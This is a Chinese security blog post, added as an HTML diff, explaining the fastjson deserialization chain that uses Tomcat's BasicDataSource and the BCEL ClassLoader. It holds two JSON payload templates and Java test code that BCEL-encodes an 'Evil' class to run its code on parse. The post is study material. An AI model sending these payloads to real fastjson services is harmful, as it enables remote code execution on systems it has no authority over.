@@ -1,0 +1,417 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>fastjson之BasicDataSource利用链 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="fastjson之BasicDataSource利用链 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="fastjson利用之BasicDataSource利用链
+BCEL介绍
+这里引用P神对BCEL的介绍：
+
+首先，BCEL究竟是什么？它为什么会出现在JDK中？
+BCEL的全名应该是Apache Commons BCEL，属于Apache ..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              fastjson之BasicDataSource利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-16
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="fastjson利用之basicdatasource利用链">fastjson利用之BasicDataSource利用链</h1>
+<h2 id="bcel介绍">BCEL介绍</h2>
+<p>这里引用P神对BCEL的介绍：</p>
+<blockquote>
+<p>首先，BCEL究竟是什么？它为什么会出现在JDK中？<br>
+BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目。Apache Commons大家应该不陌生，反序列化最著名的利用链就是出自于其另一个子项目——Apache Commons Collections。<br>
+BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。<br>
+就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code>。<br>
+据我（不严谨）的考证，JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能。准确的来说，Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中。<br>
+JAXP全名是<a href="https://zh.wikipedia.org/wiki/JAXP">Java API for XML Processing</a>，他是Java定义的一系列接口，用于处理XML相关的逻辑，包括DOM、SAX、StAX、XSLT等。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler。<br>
+XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。<br>
+XSLTC Compiler就是一个命令行编译器，可以将一个xsl文件编译成一个class文件或jar文件，编译后的class被称为translet，可以在后续用于对XML文件的转换。其实就将XSLT的功能转化成了Java代码，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程。<br>
+我们尝试用本地的Java（注意需要用Java7或6，使用8将会出现异常）来编译一下hello.xsl：<br>
+<code>java com.sun.org.apache.xalan.internal.xsltc.cmdline.Compile hello.xsl </code><br>
+可见，从hello.xsl生成了hello.class，反编译这个class即可看到源代码。<br>
+不知道大家看到这个代码里的AbstractTranslet会不会有点眼熟？我们在反序列化时常用的另一个类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，它在defineClass中需要的字节码所对应的基类，就是这里的<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。<br>
+其实Java里很多东西是有因果的，TemplatesImpl是对JAXP标准中javax.xml.transform.Templates接口的实现，前文说了，XSLT在使用时会先编译成Java字节码，这也就是为什么TemplatesImpl会使用defineClass的原因。<br>
+关于XSLT这块的内容比较多，不是本文的重点，我就不细说了。那么这部分内容和BCEL有什么关系呢？<br>
+你应该也能猜到了，因为需要“编译”XSL文件，实际上核心是动态生成Java字节码，而BCEL正是一个处理字节码的库，所以Apache Xalan是依赖BCEL的。</p>
+</blockquote>
+<h2 id="bcel-classloader使用">BCEL ClassLoader使用</h2>
+<p>BCEL中有一个ClassLoader类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，但是这个类重写了<code>java.lang.ClassLoader#loadClass()</code>方法。接下来对传入的全限定名class_name进行一系列逻辑判断：</p>
+<ol>
+<li>如果以java.、javax.、sun.，开头的全限定名使用AppClassLoader的loadClass方法进行加载该类</li>
+<li>如果以全限定名以$$BCEL$$开头则先使用<code>com.sun.org.apache.bcel.internal.classfile#decode()</code>方法将BCEL编码的内容进行解码。</li>
+<li>编码解码逻辑，编码逻辑在<code>com.sun.org.apache.bcel.internal.classfile.Utility.JavaWriter#write()</code>方法中，解码则在<code>JavaReader#read()</code>方法中，这里只查看其编码逻辑：</li>
+</ol>
+<p>前面先将字符串转为char数组然后将char数组转为字节数组，然后遍历字节数组与0x000000ff进行同或取其byte字节中的最后8位，将数值传入write()方法。<br>
+先对传入的数值b进行检查：<br>
+如果char b为a-b、A-B、0-9、_，的话就直接进行输出，如果不为其中的字符的话就输出$，并且把字节(8位)以十六进制(4位)的方式显示(转换为2个16进制的字节数组)</p>
+<pre><code class="language-java">  public static boolean isJavaIdentifierPart(char ch) {
+    return ((ch &gt;= 'a') &amp;&amp; (ch &lt;= 'z')) ||
+      ((ch &gt;= 'A') &amp;&amp; (ch &lt;= 'Z')) ||
+      ((ch &gt;= '0') &amp;&amp; (ch &lt;= '9')) ||
+      (ch == '_');
+  }
+</code></pre>
+<pre><code class="language-java">  private static class JavaWriter extends FilterWriter {
+    public JavaWriter(Writer out) {
+      super(out);
+    }
+
+    public void write(int b) throws IOException {
+      if(isJavaIdentifierPart((char)b) &amp;&amp; (b != ESCAPE_CHAR)) {
+        out.write(b);
+      } else {
+        out.write(ESCAPE_CHAR); // Escape character
+
+        // Special escape
+        if(b &gt;= 0 &amp;&amp; b &lt; FREE_CHARS) {
+          out.write(CHAR_MAP[b]);
+        } else { // Normal escape
+          char[] tmp = Integer.toHexString(b).toCharArray();
+
+          if(tmp.length == 1) {
+            out.write('0');
+            out.write(tmp[0]);
+          } else {
+            out.write(tmp[0]);
+            out.write(tmp[1]);
+          }
+        }
+      }
+    }
+
+    public void write(char[] cbuf, int off, int len) throws IOException {
+      for(int i=0; i &lt; len; i++)
+        write(cbuf[off + i]);
+    }
+
+    public void write(String str, int off, int len) throws IOException {
+      write(str.toCharArray(), off, len);
+    }
+  }
+</code></pre>
+<p>至此循环，就完成了对JavaClass类对象的字节码加密的过程，编码过后的字符串格式如下：<br>
+<code>$l$8b$I$A$A$A$A$A$A$A$8dQ$cbN$db$40$U$3d$938....</code></p>
+<ol start="4">
+<li>我们只需要这串编码过后的字符串前面加上字符串<code>$$BCEL$$</code>，其ClassLoader就会进行BCEL解码然后再将其加载</li>
+<li>调用<code>java.lang.ClassLoader#defineClass</code>生成恶意类的Class对象，并且进行初始化该类，加载类中的静态代码块中的代码，执行相关命令</li>
+</ol>
+<p>测试代码：<br>
+注意，这里的ClassLoader类不是<code>java.lang.ClassLoader</code>，而是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，这样才能进行BCEL解码从而获取其Class类</p>
+<pre><code class="language-java">public class BCELTest {
+    public static void main(String[] args) throws Exception {
+        JavaClass cls = Repository.lookupClass(Evil.class);
+        String encode = Utility.encode(cls.getBytes(), true);
+        System.out.println(encode);
+        Class.forName(&quot;$$BCEL$$&quot; + encode, true, new ClassLoader());
+    }
+}
+</code></pre>
+<h2 id="basicdatasource加载字节码">BasicDataSource加载字节码</h2>
+<p>BasicDataSource类位于org.apache.tomcat.dbcp.dbcp.BasicDataSource，我们可以直接传入经过BCEL编码后的字节码然后进行加载恶意类从而执行任意命令，并且其依赖包tomcat-dbcp使用也比较广泛，是Tomcat的数据库驱动组件。<br>
+BasicDataSource利用链的入口方法为getconnection，我们先指定该类，看看其符合条件的setter/getter：</p>
+<pre><code class="language-java">{
+    &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;
+}
+</code></pre>
+<p>但是经过调试发现fieldList中并没有一个叫connection的Fieldinfo的变量，也就是说我们根本无法调用其getter方法getconnection(返回类型不符合条件)，那我们要怎么进入这个方法呢?</p>
+<h2 id="探索如何触发getconnection">探索如何触发getConnection</h2>
+<p>当后端代码使用<code>JSON.parse()</code>进行反序列化的时候，主要是通过<code>DefaultJSONParser#parseObject()</code>方法对JSON数据进行处理，其中一个名为lexer的JSONLexer类对象负责对传入的JSON数据中的关键字符(例如{、}、[、]、:、&quot;)进行提取，其中lexer中的token应该是记录了当前关键字符是什么，bp为当前JSON数据中所在的位置，而ch则为当前位置的关键字符。<br>
+当遇到&quot;{&quot;时，会再次调用parse()方法，最终调用到<code>DefaultJSONParser#parseObject()</code>方法中。</p>
+<blockquote>
+<p>原poc利用了JSONObject对象的toString()方法实现了突破。JSONObect是Map的子类，在执行toString()时会将当前类转换为字符串形式，会提取类中所有的Field，自然会执行相应的setter、is等方法。</p>
+</blockquote>
+<pre><code class="language-java">com.alibaba.fastjson.parser.DefaultJSONParser.parseObject
+DefaultJSONParser.java:436
+
+if (object.getClass() == JSONObject.class) {
+    key = (key == null) ? &quot;null&quot; : key.toString();
+}
+</code></pre>
+<p>JSONObject继承JSON，其并没有toString()方法，调用的其实是其父类<code>JSON#toString()</code>方法。后门又调用了<code>JSON#toJSONString()</code>方法<br>
+调用顺序：<br>
+<img src="https://1jzz.github.io/post-images/1650123519972.png" alt="" loading="lazy"><br>
+变量key的值：<br>
+<img src="https://1jzz.github.io/post-images/1650123525233.png" alt="" loading="lazy"><br>
+这里有点看不明白，写的也就比较乱了，建议只看引用部分。<br>
+代码能力太弱了，还是要去从开发的层面更加全面的去看代码，继续加油吧。</p>
+<h2 id="basicdatasource调用链">BasicDataSource调用链</h2>
+<ol>
+<li>BasicDataSource.getConnection()：入口方法，为了进入createDataSource()方法</li>
+<li>BasicDataSource.createDataSource()：为了进入createConnectionFactory()方法</li>
+<li>BasicDataSource.createConnectionFactory()：</li>
+</ol>
+<p>部分代码：<br>
+我们的最终目的是为了进入<code>driverFromCCL = Class.forName(this.driverClassName, true, this.driverClassLoader);</code>，从而可以用指定的ClassLoader加载对应的类并且其初始化参数的值为true，可以初始化Class类对象从而执行该类的静态代码块中的代码。<br>
+而进入这行代码的条件需要driverClassName参数不为空，这个参数即为我们输入的BCEL编码过的恶意类字节码，此外还需要对driverClassLoader参数设定BCEL包中特殊的ClassLoader才能成功加载。</p>
+<pre><code class="language-java">protected ConnectionFactory createConnectionFactory() throws SQLException {
+    Driver driverToUse = this.driver;
+    if (driverToUse == null) {
+        Class&lt;?&gt; driverFromCCL = null;
+        String message;
+        if (this.driverClassName != null) {
+            try {
+                try {
+                    if (this.driverClassLoader == null) {
+                        driverFromCCL = Class.forName(this.driverClassName);
+                    } else {
+                        driverFromCCL = Class.forName(this.driverClassName, true, this.driverClassLoader);
+                    }
+                } catch (ClassNotFoundException var5) {
+                    driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(this.driverClassName);
+                }
+            } catch (Exception var6) {
+                message = &quot;Cannot load JDBC driver class '&quot; + this.driverClassName + &quot;'&quot;;
+                this.logWriter.println(message);
+                var6.printStackTrace(this.logWriter);
+                throw new SQLException(message, var6);
+            }
+        }
+......
+</code></pre>
+<h2 id="payload">payload</h2>
+<p>以下poc是针对后端使用<code>JSON.parse()</code>进行反序列化的poc。</p>
+<blockquote>
+<p>当然，如果目标环境的开发者代码中是调用的是 JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter 方法。</p>
+</blockquote>
+<pre><code class="language-java">{
+    {
+       &quot;1jzz&quot;:{
+           &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+           &quot;driverClassLoader&quot;:{&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;},
+           &quot;driverClassName&quot;:&quot;$$BCEL$$......&quot;
+           }
+    }: &quot;1jzz&quot;
+}
+</code></pre>
+<p>以下poc是针对后端使用<code>JSON.parseObject()</code>进行反序列化的poc。</p>
+<pre><code class="language-java">{
+   &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+   &quot;driverClassLoader&quot;:{&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;},
+   &quot;driverClassName&quot;:&quot;$$BCEL$$......&quot;
+}
+</code></pre>
+<p>在实际利用中使用第一个即可，后端用parse或者parseObject都有效。<br>
+测试代码：</p>
+<pre><code class="language-java">public class BCELTest {
+    public static void main(String[] args) throws Exception {
+        JavaClass cls = Repository.lookupClass(Evil.class);
+        String encode = Utility.encode(cls.getBytes(), true);
+        //Class.forName(&quot;$$BCEL$$&quot; + encode, true, new ClassLoader());
+
+        String json = &quot;{\n&quot; +
+                &quot;    {\n&quot; +
+                &quot;       \&quot;1jzz\&quot;:{\n&quot; +
+                &quot;           \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot; +
+                &quot;           \&quot;driverClassLoader\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;},\n&quot; +
+                &quot;           \&quot;driverClassName\&quot;:\&quot;&quot;+ &quot;$$BCEL$$&quot; + encode +&quot;\&quot;\n&quot; +
+                &quot;           }\n&quot; +
+                &quot;    }: \&quot;1jzz\&quot;\n&quot; +
+                &quot;}&quot;;
+        System.out.println(json);
+        Object obj = JSON.parse(json);
+    }
+}
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1650123533006.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>这条利用链相比TemplatesImpl利用链来说使用范围更广，且不需要其他额外配置</li>
+<li>和TemplatesImpl一样也是注入字节码，不需要出网</li>
+<li>但是需要tomcat-dbcp依赖包支持</li>
+</ul>
+<h2 id="tomcat依赖包路径变化">Tomcat依赖包路径变化</h2>
+<p>8.0之前：<br>
+<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code><br>
+8.0之后：<br>
+<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
+<h1 id="参考">参考</h1>
+<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x03-bcelfastjson">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></li>
+<li><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fastjson%E5%88%A9%E7%94%A8%E4%B9%8Bbasicdatasource%E5%88%A9%E7%94%A8%E9%93%BE">fastjson利用之BasicDataSource利用链</a>
+<ul>
+<li><a href="#bcel%E4%BB%8B%E7%BB%8D">BCEL介绍</a></li>
+<li><a href="#bcel-classloader%E4%BD%BF%E7%94%A8">BCEL ClassLoader使用</a></li>
+<li><a href="#basicdatasource%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">BasicDataSource加载字节码</a></li>
+<li><a href="#%E6%8E%A2%E7%B4%A2%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91getconnection">探索如何触发getConnection</a></li>
+<li><a href="#basicdatasource%E8%B0%83%E7%94%A8%E9%93%BE">BasicDataSource调用链</a></li>
+<li><a href="#payload">payload</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a>
+<ul>
+<li><a href="#tomcat%E4%BE%9D%E8%B5%96%E5%8C%85%E8%B7%AF%E5%BE%84%E5%8F%98%E5%8C%96">Tomcat依赖包路径变化</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/x7gAxvFB_/">
+              <h3 class="post-title">
+                fastjson之TemplatesImpl利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
